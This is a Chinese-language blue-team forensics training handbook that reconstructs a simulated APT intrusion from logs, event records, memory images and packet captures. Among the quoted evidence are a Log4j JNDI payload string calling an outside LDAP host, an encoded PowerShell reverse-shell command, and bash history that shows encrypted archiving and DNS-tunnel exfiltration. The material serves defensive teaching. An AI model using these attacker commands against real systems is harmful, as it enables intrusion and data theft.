# 實戰手冊 28.1：端到端 APT 攻擊鏈全局溯源、多階威脅取證與 CTF 奪旗閉環

## 案發現場破題

在真實企業遭遇 APT（進階持續性威脅）組織攻擊時，防禦團隊面對的絕不是單一孤立的警報，而是一條橫跨外部邊界、內部跳板、身分驗證中心與核心資料儲存庫的完整攻擊鏈（Kill Chain / ATT&CK Attack Flow）。

本實戰手冊作為藍隊頂石專題（Capstone）的「端到端綜合溯源」考驗，設計了一個典型的國家級/有組織網路犯罪 APT 全真演練場景：
某跨國企業核心技術資產遭未知威脅組織滲透並完成核心機密外洩。藍隊鑑識人員臨危受命，接收到防火牆 PCAP 封包、邊界伺服器 Web Access Log、內部域控 Windows Security EVTX 與核心 Linux 資料庫端點記憶體鏡像等跨源鑑識資料。

學員必須化身為資深 DFIR 鑑識指揮官，串聯離散跡證，依序還原：
1. **Initial Access（初始存取）**：水坑網站（Watering Hole）與 N-Day 外部 Web 漏洞攻陷邊界 DMZ 伺服器；
2. **Execution & Persistence（執行與常駐）**：植入記憶體馬（Filter Memshell）與建立排程任務；
3. **Privilege Escalation & Credential Access（權限提升與憑證存取）**：透過 Kerberoasting 與 DCSync 竊取域控 Enterprise Admins 憑證雜湊；
4. **Lateral Movement（橫向移動）**：利用 WMI / SMB Exec 橫向跳躍至核心財務與原始碼儲存伺服器；
5. **Collection & Exfiltration（資料收集與外洩）**：使用 7-Zip 加密打包機密資料，並透過 DNS 隱蔽通道與 HTTPS 雙軌外洩至海外 C2 節點。


## 第二動：突破口深入溯源——初始入侵 (Initial Access)

### 2.1 邊界 Web 日誌特徵篩選與惡意載荷提取
檢視 Web 存取記錄，尋找利用 JNDI/Log4j 注入或反序列化攻擊的蛛絲馬跡：

```bash
# 1. 搜尋包含常見 RCE 特徵字串與 JNDI 語法的請求
grep -Ei "jndi:(ldap|rmi|dns)|(\$\{jndi)" /evidence/dmz_web/access.log | head -n 5

# 典型惡意日誌條目：
# 45.33.32.156 - - [08/May/2026:14:22:10 +0800] "GET /api/login HTTP/1.1" 200 452 "${jndi:ldap://198.51.100.22:1389/Exploit}" "Mozilla/5.0"

# 2. 統計攻擊來源 IP 與時間跨度
awk '{print $1}' /evidence/dmz_web/access.log | sort | uniq -c | sort -nr | head -n 10
```

### 2.2 端點行為比對：惡意子行程產生
在邊界伺服器 Windows Sysmon EVTX 中比對 Event ID 1（Process Creation），驗證 JVM 衍生之後門行程：
```powershell
# 檢索 java.exe 衍生之子行程
Get-WinEvent -Path "C:\Evidence\dmz_sysmon.evtx" -FilterXPath @"
*[System[(EventID=1)]] and 
*[EventData[Data[@Name='ParentImage'] and (contains(., 'java.exe') or contains(., 'tomcat.exe'))]]
"@ | Select-Object TimeCreated, @{N='CommandLine';E={$_.Properties[10].Value}}, @{N='ParentProcess';E={$_.Properties[21].Value}}
```
**關鍵跡證發現**：`java.exe` 於 `06:22:15Z` 執行 `cmd.exe /c powershell -enc JABjAGwAaQBlAG4AdAA...`，確認已透過 RCE 取得反彈 Shell。

## 第三動：內部橫向跳板與憑證收割溯源 (Lateral Movement & Credential Access)

### 3.1 域控 Security 日誌檢索：Kerberoasting 票證請求
攻擊者在取得邊界主機控制權後，利用本機權限向域控請求註冊有 SPN 的服務帳號 TGS 票證：

```powershell
# 搜尋 Event ID 4769 (A Kerberos service ticket was requested)
# 關注 Ticket Options 為 0x40810000 且 Ticket Encryption Type 為 0x17 (RC4-HMAC)
Get-WinEvent -Path "C:\Evidence\dc01_security.evtx" -FilterXPath @"
*[System[(EventID=4769)]] and 
*[EventData[Data[@Name='TicketEncryptionType']='0x17' and Data[@Name='ServiceName']!='krbtgt']]
"@ | Format-List TimeCreated, Message
```
**關鍵跡證**：發現服務帳號 `MSSQL_Service` 被密集申請 RC4 票證，隨後在邊界主機發現 `hashcat.exe` 的執行痕跡。

### 3.2 域複製權限濫用：DCSync 導出全域雜湊
攻擊者破解 `MSSQL_Service` 密碼後，發現該帳號具備 `DS-Replication-Get-Changes-All` 特權，隨即發起 DCSync：
```powershell
# 搜尋 Event ID 4662 (An operation was performed on an object)
# 關注 Properties 包含 DS-Replication GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
Get-WinEvent -Path "C:\Evidence\dc01_security.evtx" -FilterXPath @"
*[System[(EventID=4662)]] and 
*[EventData[Data[@Name='ObjectType']='{19195a5b-6da0-11d0-afd3-00c04fd930c9}' and 
Data[@Name='AccessMask']='0x100']]
"@ | Select-Object TimeCreated, @{N='Account';E={$_.Properties[1].Value}}
```

## 第四動：核心機密儲存庫入侵與資料外洩管道還原 (Collection & Exfiltration)

### 4.1 Linux 記憶體取證還原外洩命令列
使用 Volatility 3 分析核心 Linux 資料庫主機實體記憶體鏡像 `core_db.lime`：

```bash
# 1. 檢視 Linux 記憶體內的 Bash 命令歷史與當前行程
python3 vol.py -f /evidence/core_db.lime linux.bash.Bash

# 發現關鍵執行指令：
# 2026-05-08 06:45:12 tar -czvf /tmp/src_backup.tar.gz /var/www/proprietary_code/
# 2026-05-08 06:46:00 7z a -pSecretKey9988! -mhe=on /tmp/exfil.7z /tmp/src_backup.tar.gz
# 2026-05-08 06:47:30 python3 /tmp/dnsexfil.py -d corp-update.online -f /tmp/exfil.7z

# 2. 檢視網路連線狀態
python3 vol.py -f /evidence/core_db.lime linux.sockstat.Sockstat | grep -E "ESTABLISHED|CLOSE_WAIT"
```

### 4.2 網路流量 PCAP 解析：DNS 隱蔽傳輸外洩重組
分析外洩期間的流量封包，重組 DNS Tunneling 所夾帶之 Base64 酬載：

```python
# 腳本範例：提取 DNS Tunneling 子域名並還原檔案 (reassemble_dns.py)
import pyshark
import base64

cap = pyshark.FileCapture('/evidence/network_capture.pcap', display_filter='dns.flags.response == 0 and dns.qry.name contains "corp-update.online"')

chunks = {}
for pkt in cap:
    try:
        qname = pkt.dns.qry_name
        # 典型結構: chunk-01.YWJjZGVm...corp-update.online
        parts = qname.split('.')
        seq = int(parts[0].replace('chunk-', ''))
        data = parts[1]
        chunks[seq] = data
    except Exception:
        continue

sorted_data = "".join([chunks[k] for k in sorted(chunks.keys())])
with open('/tmp/restored_exfil.7z', 'wb') as f:
    f.write(base64.b64decode(sorted_data))

print(f"[*] DNS Exfiltration 檔案還原完成，位元組數: {len(sorted_data)}")
```
